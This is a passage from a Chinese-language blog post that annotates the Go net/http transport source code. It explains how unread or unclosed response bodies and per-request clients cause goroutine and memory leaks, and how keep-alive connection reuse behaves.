fmt.Errorf(&quot;net&#x2F;http: server response headers exceeded %d bytes; aborted&quot;, pc.maxHeaderResponseSize())</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			select &#123;</span><br><span class="line">			case rc.ch &lt;- responseAndError&#123;err: err&#125;:</span><br><span class="line">			case &lt;-rc.callerGone:</span><br><span class="line">				return</span><br><span class="line">			&#125;</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		pc.readLimit &#x3D; maxInt64 &#x2F;&#x2F; effictively no limit for response bodies</span><br><span class="line"></span><br><span class="line">		pc.mu.Lock()</span><br><span class="line">		pc.numExpectedResponses--</span><br><span class="line">		pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">		bodyWritable :&#x3D; resp.bodyIsWritable()</span><br><span class="line">		hasBody :&#x3D; rc.req.Method !&#x3D; &quot;HEAD&quot; &amp;&amp; resp.ContentLength !&#x3D; 0</span><br><span class="line"></span><br><span class="line">		if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">			&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">			&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">			&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">			alive &#x3D; false</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if !hasBody || bodyWritable &#123;</span><br><span class="line">			pc.t.setReqCanceler(rc.req, nil)</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; Put the idle conn back into the pool before we send the response</span><br><span class="line">			&#x2F;&#x2F; so if they process it quickly and make another request, they&#39;ll</span><br><span class="line">			&#x2F;&#x2F; get this same conn. But we use the unbuffered channel &#39;rc&#39;</span><br><span class="line">			&#x2F;&#x2F; to guarantee that persistConn.roundTrip got out of its select</span><br><span class="line">			&#x2F;&#x2F; potentially waiting for this persistConn to close.</span><br><span class="line">			&#x2F;&#x2F; but after</span><br><span class="line">			alive &#x3D; alive &amp;&amp;</span><br><span class="line">				!pc.sawEOF &amp;&amp;</span><br><span class="line">				pc.wroteRequest() &amp;&amp;</span><br><span class="line">				tryPutIdleConn(trace)</span><br><span class="line"></span><br><span class="line">			if bodyWritable &#123;</span><br><span class="line">				closeErr &#x3D; errCallerOwnsConn</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			select &#123;</span><br><span class="line">			case rc.ch &lt;- responseAndError&#123;res: resp&#125;: &#x2F;&#x2F;利用chan将respone数据发送到上层</span><br><span class="line">			case &lt;-rc.callerGone:</span><br><span class="line">				return</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; Now that they&#39;ve read from the unbuffered channel, they&#39;re safely</span><br><span class="line">			&#x2F;&#x2F; out of the select that also waits on this goroutine to die, so</span><br><span class="line">			&#x2F;&#x2F; we&#39;re allowed to exit now if needed (if alive is false)</span><br><span class="line">			testHookReadLoopBeforeNextRead()</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		waitForBodyRead :&#x3D; make(chan bool, 2)</span><br><span class="line">		&#x2F;&#x2F;这里是最关键的地方，close函数实际上就是调用了earlyCloseFn函数，后面详细讲</span><br><span class="line">		body :&#x3D; &amp;bodyEOFSignal&#123;</span><br><span class="line">			body: resp.Body,</span><br><span class="line">			earlyCloseFn: func() error &#123;</span><br><span class="line">				waitForBodyRead &lt;- false</span><br><span class="line">				&lt;-eofc &#x2F;&#x2F; will be closed by deferred call at the end of the function</span><br><span class="line">				return nil</span><br><span class="line"></span><br><span class="line">			&#125;,</span><br><span class="line">			fn: func(err error) error &#123;</span><br><span class="line">				isEOF :&#x3D; err &#x3D;&#x3D; io.EOF</span><br><span class="line">				waitForBodyRead &lt;- isEOF</span><br><span class="line">				if isEOF &#123;</span><br><span class="line">					&lt;-eofc &#x2F;&#x2F; see comment above eofc declaration</span><br><span class="line">				&#125; else if err !&#x3D; nil &#123;</span><br><span class="line">					if cerr :&#x3D; pc.canceled(); cerr !&#x3D; nil &#123;</span><br><span class="line">						return cerr</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				return err</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		resp.Body &#x3D; body &#x2F;&#x2F;利用bodyEOFSignal封装body</span><br><span class="line">		if rc.addedGzip &amp;&amp; strings.EqualFold(resp.Header.Get(&quot;Content-Encoding&quot;), &quot;gzip&quot;) &#123;</span><br><span class="line">			resp.Body &#x3D; &amp;gzipReader&#123;body: body&#125;</span><br><span class="line">			resp.Header.Del(&quot;Content-Encoding&quot;)</span><br><span class="line">			resp.Header.Del(&quot;Content-Length&quot;)</span><br><span class="line">			resp.ContentLength &#x3D; -1</span><br><span class="line">			resp.Uncompressed &#x3D; true</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		select &#123;</span><br><span class="line">		case rc.ch &lt;- responseAndError&#123;res: resp&#125;:</span><br><span class="line">		case &lt;-rc.callerGone:</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Before looping back to the top of this function and peeking on</span><br><span class="line">		&#x2F;&#x2F; the bufio.Reader, wait for the caller goroutine to finish</span><br><span class="line">		&#x2F;&#x2F; reading the response body. (or for cancellation or death)</span><br><span class="line">		select &#123;</span><br><span class="line">		&#x2F;&#x2F;内存泄露的元凶</span><br><span class="line">		case bodyEOF :&#x3D; &lt;-waitForBodyRead:</span><br><span class="line">			pc.t.setReqCanceler(rc.req, nil) &#x2F;&#x2F; before pc might return to idle pool</span><br><span class="line">			alive &#x3D; alive &amp;&amp; </span><br><span class="line">				bodyEOF &amp;&amp;</span><br><span class="line">				!pc.sawEOF &amp;&amp;</span><br><span class="line">				pc.wroteRequest() &amp;&amp;</span><br><span class="line">				tryPutIdleConn(trace) 	&#x2F;&#x2F;尝试将connection放回连接池</span><br><span class="line">			if bodyEOF &#123;</span><br><span class="line">				eofc &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		case &lt;-rc.req.Cancel:</span><br><span class="line">			alive &#x3D; false</span><br><span class="line">			pc.t.CancelRequest(rc.req)</span><br><span class="line">		case &lt;-rc.req.Context().Done():</span><br><span class="line">			alive &#x3D; false</span><br><span class="line">			pc.t.cancelRequest(rc.req, rc.req.Context().Err())</span><br><span class="line">		case &lt;-pc.closech:</span><br><span class="line">			alive &#x3D; false</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		testHookReadLoopBeforeNextRead()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到，负责读response的goroutine会以alive为条件不断循环，这时想让此goroutine退出，需要将alive置为false，但是我们可以看到最后有一个select语句，在一切正常的情况下（下面的几个错误信号不来的情况下）应当是由waitForBodyRead这个chan来推进整个goroutine，但是从上方代码我们可以看到，想让此chan中被写入数据，只有两个回调函数earlyCloseFn和fn，那我们来看看这两个函数应当如何被触发：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">	es.mu.Lock()</span><br><span class="line">	closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">	es.mu.Unlock()</span><br><span class="line">	if closed &#123;</span><br><span class="line">		return 0, errReadOnClosedResBody</span><br><span class="line">	&#125;</span><br><span class="line">	if rerr !&#x3D; nil &#123;</span><br><span class="line">		return 0, rerr</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	n, err &#x3D; es.body.Read(p)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		es.mu.Lock()</span><br><span class="line">		defer es.mu.Unlock()</span><br><span class="line">		if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">			es.rerr &#x3D; err</span><br><span class="line">		&#125;</span><br><span class="line">		err &#x3D; es.condfn(err)</span><br><span class="line">	&#125;</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">	es.mu.Lock()</span><br><span class="line">	defer es.mu.Unlock()</span><br><span class="line">	if es.closed &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	es.closed &#x3D; true</span><br><span class="line">	if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">		return es.earlyCloseFn()</span><br><span class="line">	&#125;</span><br><span class="line">	err :&#x3D; es.body.Close()</span><br><span class="line">	return es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; caller must hold es.mu.</span><br><span class="line">func (es *bodyEOFSignal) condfn(err error) error &#123;</span><br><span class="line">	if es.fn &#x3D;&#x3D; nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">	err &#x3D; es.fn(err)</span><br><span class="line">	es.fn &#x3D; nil</span><br><span class="line">	return err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  终于看到了我们心心念念的Close方法，可以看到Close方法在es.earlyCloseFn != nil &amp;&amp; es.rerr != io.EOF的情况下会触发earlyCloseFn方法（这里有很多情况，后面详细讨论）</p>
-<p>  而当这一条件不满足时，Close方法将会调用condfn方法，仔细看，其实这一方法在上面的Read方法中也会调用，而Read方法实际和io里Reader有关，也就是说Read方法实际在我们读resp.Body的时候会触发（相当于我们在读出Body中数据的过程中会触发这个方法）</p>
-<p>  那么也就是说，如果我们既不读Body中的数据也不调用Close方法，那么这个goroutine和writeloop的goroutine将无法退出（因为writeloop是当readerloop这个goroutine退出时才会退出，可看readloop开头的defer语句），这就将导致大量的goroutine阻塞在select语句无法退出，而且占用了此persistconn，导致连接池中一直无法有空闲的persistconn放回，这会导致HTTP1.1直接退化到1.0（一个http请求一个tcp connection），相关资源也无法被gc回收，最终导致内存泄露的问题。</p>
-<p>  不过从代码上来看，实际上不仅仅是一定要调用Close方法才可以防止内存泄露，实际上如果能将Body数据读完也是可以的，但建议最好还是调用Close方法，因为也许有许多异常状态会发生（其实如果正常读写，并在读完后调用Close方法，类似于我最开始那个正确的程序，那么Close方法的判断条件中es.rerr会一直等于io.EOF，所以不是说调用了Close方法就会关闭读写的goroutine(实际在既读又close的情况下，只要connection不断开，Close方法只是关闭了io.Reader而已，而且connection的异常实际上也不是由Close方法负责，而是由readloop方法中的resp.Close来进行判断，所以实际上Close方法并非是我们所认为的关闭connection，释放资源（除了io.Reader出现错误时，或者没有读body时才是扮演这一角色），绝大多数情况下，Close方法只是用来关闭读取Body的io.Reader,与connection异常并无关联，也不会实际上执行退出goroutine以供gs释放资源的行为）</p>
-<p>  所以在正常情况下（尤其是既Close又read的情况下），调用Close方法实际就是关闭了io.Reader后调用了condfn方法，而且正常情况下，condfn方法中的es.fn其实一直是nil，直到Body中的数据被读完，此时Read方法再次调用condfn方法时，es.fn才会被赋值为之前在readloop中定义的回调函数的地址(猜想这也是为了保证先等上层读完数据之后才继续接着取数据），从而将goroutine不阻塞在select，并把connection重新放回连接池备用（此时goroutine也不会退出，因为err是io.Eof,alive并不会变为false导致退出循环）），当Read操作做完之后，Close方法关闭Reader，调用condfn方法，但这时候es.fn又变为了nil（读body的操作已经做完，es.fn重新变为nil,其实可以它看作驱动器，只有当上层读完数据，需要读写goroutine进行下一次循环时，才会被赋值，执行回调函数，推进整个循环结构的进行，防止阻塞)，故而不会执行任何其余操作了。</p>
-<p>  简而言之，每一个connection都有一对goroutine负责读写，在读写完一次之后，readloop这个routine会负责将这个connection放回连接池，并且俩goroutine都不会退出，等到connection上有新的request时，这两个goroutine将会再次被激活，如此往复。</p>
-<h1 id="KeepAlive机制"><a href="#KeepAlive机制" class="headerlink" title="KeepAlive机制"></a>KeepAlive机制</h1><p>  继续上文，那么什么时候Close函数会被调用并使得goroutine退出呢？那就是当我一开始的代码改为下面这样的时候：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">	resp, err :&#x3D; client.Get(url)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">	&#x2F;&#x2F;fmt.Println(&quot;copy&quot;)</span><br><span class="line">	&#x2F;&#x2F; buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">	&#x2F;&#x2F; fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">	if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;close&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  此时我们不读Body中的数据，直接关闭，那么这个时候，Close函数中的es.rerr会变为nil，从而触发earlyClosefn函数，使得读写goroutine全部退出，connection关闭</p>
-<p>  在这个问题上，我还想讨论一个机制，那就是keepalive的机制，我们都知道keepalive是旨在让connection更多的承载http信息，而不用一个http创建一个tcp，从而节省资源。</p>
-<p>  在go中，我们可以通过Transport的Disablekeepalive选项来选择关闭或者启用，当我们关闭了keepalive机制的时候，那么每一个http请求都会新建一个tcp连接，而每个连接将都不会放入client的连接池中，这意味着所有连接都不可复用，两个负责读写的goroutine也是只处理一个request后立即退出</p>
-<p>  <strong>这里有一点要注意，那就是如果你启用了keepalive选项，并不代表你的所有连接真的可以复用了，因为我在实际测试中发现，如果对方服务器的返回头当中Connection这一项置空，那么哪怕你自己启用了，实际上还是有可能无法复用的，这一点很奇怪，因为我看了不少资料表示http1.1应该是默认keepalive，除非显式指明Connection头为close才会导致不启用复用的情况，但是在实际测试中我发现这在一定程度上不是很准确，并不是所有的都默认启用，有些特例是不会的，例如python的SimpleHttpServer，就是默认不启用，返回的头中也没有keealive，所以具体还是看实现</strong></p>
-<p><strong>做了个实验，证实了就算服务端包头没有connection alive也可能会keepalive，主要还是看服务器具体如何实现的（绝大多数都是默认支持keep的，不管返回包是否写明，因为http1.1默认实现），附上一张抓包图</strong></p>
-<p><img src="/image/Sourcecode/fake-not-keepalive.png" alt="capture"></p>
-<p><strong>可以看见虽然服务器返回头当中没有keepalive（客户端request有keepalive），但是仍然保持了长连接并没有断开，说明还是默认实现了keepalive机制</strong></p>
-<p>  注：我这里举的例子是在两边均同意复用的情况下才称为keepalive机制启用，vice versa。</p>
-<p>  keepalive关闭时分四种情况：</p>
-<p>   首先每次都会新建连接，读写goroutine也都是新的</p>
-<p>  （1）如果我们既读Body数据，也close了body，那么最后导致读写goroutine退出的将是因为下方代码中resp.Close变为true（因为这个标志表示连接已经断开，不可读，并且由于这句判断语句是在goroutine读取了connection之后判断的，所以实际上在第一次的request读完之后就已经变为了false）-&gt;Read方法-&gt;condfn方法-&gt;goroutine解除阻塞，此时由于alive已经变为false，从而使得两个goroutine在下个循环之前退出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">			&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">			&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">			&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">			alive &#x3D; false</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  （2）如果我们没有读数据，直接Close了Body，那么最后导致读写goroutine退出的将是由Close方法中es.rerr等于nil导致earlyCloseFn方法被触发，从而直接退出goroutine（er.rerr正常情况下应该是io.EOF，表示body在被正常读取）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">		return es.earlyCloseFn()</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  （3）如果我们只读数据，不Close，那么情况和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()),详情可看下面，写在后面了</p>
-<p>  （4）如果我们不读也不Close，这里由于keepalive本身就被关闭，connection在一次resquest/response后也失效了，但是由于goroutine一直阻塞，无法退出，所以占用的资源一直无法释放,最后会导致内存泄露</p>
-<p>   keepalive开启时也分四种情况：</p>
-<p>   首先每次连接只要连接池中有足够的空闲connection，则不需要新建，可以直接复用，默认情况下每个host对应最多两个connection</p>
-<p>  （1）如果我们既读Body数据，也close了body，那么读写goroutine在keepalive到期之前将不会退出，一直会重复处理connection数据，将connection放回连接池，处理connection数据。。。这样的循环操作，直到keepalive到期，然后就和keepalive关闭时第一种情况一样了</p>
-<p>  （2）如果我们不读数据，直接close，那么keepalive将会失效（其实不是真的失效，只是因为不读数据的情况下，es.rerr为nil，导致goroutine被退出，无法放入连接池以供复用，所以看起来好像是失效了，实际只是我们强行关闭了）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">	es.mu.Lock()</span><br><span class="line">	closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">	es.mu.Unlock()</span><br><span class="line">	if closed &#123;</span><br><span class="line">		return 0, errReadOnClosedResBody</span><br><span class="line">	&#125;</span><br><span class="line">	if rerr !&#x3D; nil &#123;</span><br><span class="line">		return 0, rerr</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	n, err &#x3D; es.body.Read(p)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		es.mu.Lock()</span><br><span class="line">		defer es.mu.Unlock()</span><br><span class="line">		if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">              &#x2F;&#x2F;因为没有调用read方法，所以es.rerr一直是nil，无法被赋新值，故而close函数中条件被满足了</span><br><span class="line">	           es.rerr &#x3D; err</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(&quot;wo zai read han shu zheer&quot;)</span><br><span class="line">		err &#x3D; es.condfn(err)</span><br><span class="line">	&#125;</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  （3）如果我们只读数据，不close，和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">	fmt.Println(&quot;wori...&quot;)</span><br><span class="line">	es.mu.Lock()</span><br><span class="line">	defer es.mu.Unlock()</span><br><span class="line">	if es.closed &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	es.closed &#x3D; true</span><br><span class="line">      &#x2F;&#x2F;es.rerr应该就是记录reader的上一个状态，如果是EOF，那么说明是正常的读写完成，无需退出goroutine</span><br><span class="line">	if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">		fmt.Print(&quot;i am close&quot;)</span><br><span class="line">		return es.earlyCloseFn()</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;正常读数据的话会走到这里而不是在上面的if就返回</span><br><span class="line">        &#x2F;&#x2F;下面这行应该就是关闭了读Body的io.Reader</span><br><span class="line">	err :&#x3D; es.body.Close()</span><br><span class="line">	fmt.Println(&quot;err is:&quot;, err)</span><br><span class="line">	return es.condfn(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  （4）如果我们既不读也不close，那么keepalive将会失效，因为读写goroutine被阻塞，无法将connection放入连接池，导致后续数据传输无法复用connection，只能一个http请求一个tcp连接，最终导致内存泄露。</p>
-<h1 id="另一个小坑点"><a href="#另一个小坑点" class="headerlink" title="另一个小坑点"></a>另一个小坑点</h1><p>  切记不要在每个请求里都新建一个client结构体。。。也就是说下面的代码是错误的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;net&#x2F;http&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	for &#123;</span><br><span class="line">		test()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line">	transport :&#x3D; http.Transport&#123;</span><br><span class="line">		DisableKeepAlives: true,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">		Transport: &amp;transport,</span><br><span class="line">		Timeout:   10 * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line">	request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">	resp, err :&#x3D; client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这样会导致内存疯长，实测。。。</p>
-<p>而且在源码中，作者也有注释：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; A Client is an HTTP client. Its zero value (DefaultClient) is a</span><br><span class="line">&#x2F;&#x2F; usable client that uses DefaultTransport.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; The Client&#39;s Transport typically has internal state (cached TCP</span><br><span class="line">&#x2F;&#x2F; connections), so Clients should be reused instead of created as</span><br><span class="line">&#x2F;&#x2F; needed. Clients are safe for concurrent use by multiple goroutines.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; A Client is higher-level than a RoundTripper (such as Transport)</span><br><span class="line">&#x2F;&#x2F; and additionally handles HTTP details such as cookies and</span><br><span class="line">&#x2F;&#x2F; redirects.</span><br></pre></td></tr></table></figure>
-<p>因为client结构底层维护了一个连接池，所以不需要每次都新建，正确代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;net&#x2F;http&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	transport &#x3D; http.Transport&#123;</span><br><span class="line">		DisableKeepAlives: true,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	client &#x3D; &amp;http.Client&#123;</span><br><span class="line">		Transport: &amp;transport,</span><br><span class="line">		Timeout:   10 * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	for &#123;</span><br><span class="line">		test()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line"></span><br><span class="line">	request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">	resp, err :&#x3D; client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  其实看似简单的功能背后也有很多玄机，随便看看都是一个个大坑（笑）</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/14/Go-source-code/" data-id="ckhx9967a001war5y0mp19114" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/" rel="tag">code</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/">赏金猎人</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
